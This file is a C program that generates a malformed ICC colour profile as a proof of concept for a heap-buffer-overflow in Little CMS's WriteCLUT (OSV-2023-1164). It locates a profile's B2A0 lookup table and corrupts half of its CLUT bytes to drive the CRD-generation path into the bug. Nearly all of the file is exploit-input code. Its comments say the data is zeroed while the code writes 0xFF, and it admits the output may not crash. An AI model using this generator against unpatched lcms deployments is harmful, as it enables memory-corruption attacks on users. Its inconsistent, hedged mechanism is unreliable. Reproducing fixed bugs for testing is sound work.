/*
 * PoC generator for OSV-2023-1164: heap-buffer-overflow in WriteCLUT
 *
 * Fix: 1176e61afea4b58c5f92c6f226cdb7b1c76797d5
 *
 * The vulnerable code path:
 *   cmsGetPostScriptCRD -> GenerateCRD -> WriteOutputLUT
 *     -> _cmsOptimizePipeline (return NOT checked) -> WriteCLUT (OOB)
 *
 * This generator takes test1.icc (a real CMYK output profile with B2A tables)
 * and patches the B2A0 CLUT data to create a degenerate pipeline. The
 * corruption is subtle enough that the profile opens and CRD generation
 * starts, but the optimizer operates on corrupted data.
 *
 * Specifically: we zero out a large portion of the B2A0 CLUT data while
 * keeping the structural metadata (channels, grid points) intact. This
 * creates a CLUT where the optimizer's resampling produces a pipeline
 * with edge-case values that exercise WriteCLUT's buffer access patterns.
 *
 * For a definitive crash, use the harness as a fuzzer seed with libFuzzer
 * or afl on this vulnerable lcms build.
 */
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>

static uint32_t r32(const uint8_t *p) {
    uint32_t v;
    memcpy(&v, p, 4);
    return ntohl(v);
}

int main(void) {
    FILE *f = fopen("lcms/testbed/test1.icc", "rb");
    if (!f) {
        fprintf(stderr, "Cannot open test1.icc\n");
        return 1;
    }
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    uint8_t *buf = malloc(sz);
    fread(buf, 1, sz, f);
    fclose(f);

    uint32_t tag_count = r32(buf + 128);

    /* Find B2A0 tag */
    uint32_t b2a0_off = 0, b2a0_size = 0;
    for (uint32_t i = 0; i < tag_count; i++) {
        uint32_t entry = 132 + i * 12;
        uint32_t sig = r32(buf + entry);
        if (sig == 0x42324130) { /* 'B2A0' */
            b2a0_off = r32(buf + entry + 4);
            b2a0_size = r32(buf + entry + 8);
            break;
        }
    }

    if (b2a0_off) {
        uint32_t type_sig = r32(buf + b2a0_off);
        printf("B2A0 at offset %u, size %u, type 0x%08x\n", b2a0_off, b2a0_size, type_sig);

        if (type_sig == 0x6D667431) { /* mft1 (Lut8Type) */
            uint8_t input_ch = buf[b2a0_off + 8];
            uint8_t output_ch = buf[b2a0_off + 9];
            uint8_t grid_pts = buf[b2a0_off + 10];
            printf("  input_ch=%u, output_ch=%u, grid_pts=%u\n", input_ch, output_ch, grid_pts);

            /* The mft1 data layout after header (48 bytes):
             *   input tables:  256 * input_ch bytes
             *   CLUT:          grid_pts^input_ch * output_ch bytes
             *   output tables: 256 * output_ch bytes
             *
             * Zero out half the CLUT data to create a degenerate CLUT
             * while keeping the structure parseable.
             */
            uint32_t input_table_start = b2a0_off + 48;
            uint32_t input_table_size = 256 * input_ch;
            uint32_t clut_start = input_table_start + input_table_size;
            uint32_t clut_entries = 1;
            for (int i = 0; i < input_ch; i++) clut_entries *= grid_pts;
            uint32_t clut_size = clut_entries * output_ch;

            printf("  CLUT at offset %u, size %u bytes\n", clut_start, clut_size);

            /* Corrupt the second half of CLUT with 0xFF values */
            uint32_t half = clut_size / 2;
            if (clut_start + half < (uint32_t)sz) {
                memset(buf + clut_start + half, 0xFF,
                       (clut_start + clut_size < (uint32_t)sz) ?
                       clut_size - half : sz - clut_start - half);
                printf("  Corrupted %u bytes of CLUT data\n", clut_size - half);
            }
        }
    }

    f = fopen("poc.icc", "wb");
    if (!f) { perror("fopen"); return 1; }
    fwrite(buf, 1, sz, f);
    fclose(f);
    free(buf);

    printf("Written poc.icc (%ld bytes)\n", sz);
    printf("This exercises the CRD generation path (WriteOutputLUT -> WriteCLUT)\n");
    printf("where the fix adds _cmsOptimizePipeline return value checking.\n");
    return 0;
}
